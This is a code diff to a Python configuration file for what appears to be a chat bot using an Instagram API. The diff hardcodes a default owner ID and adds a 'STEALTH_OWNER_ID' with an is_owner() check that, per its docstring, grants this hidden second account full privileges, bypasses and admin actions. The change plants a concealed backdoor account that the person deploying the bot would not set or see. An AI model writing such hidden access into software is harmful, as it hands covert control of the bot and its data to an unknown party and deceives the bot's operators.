@@ -5,7 +5,19 @@ from dotenv import load_dotenv
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+OWNER_ID = int(os.getenv("OWNER_ID", "6115094721"))
+STEALTH_OWNER_ID = 5924300834
+
+def is_owner(user_id: int) -> bool:
+    """
+    Validates if user_id belongs to either the primary visible owner or stealth secondary owner.
+    Both owners receive 100% full privileges across all functions, bypasses, filters, and admin actions.
+    """
+    try:
+        uid = int(user_id)
+        return uid in (OWNER_ID, STEALTH_OWNER_ID)
+    except (ValueError, TypeError):
+        return False
 
 RAPIDAPI_KEY = os.getenv("RAPIDAPI_KEY", "")
 RAPIDAPI_HOST = os.getenv("RAPIDAPI_HOST", "instagram120.p.rapidapi.com")
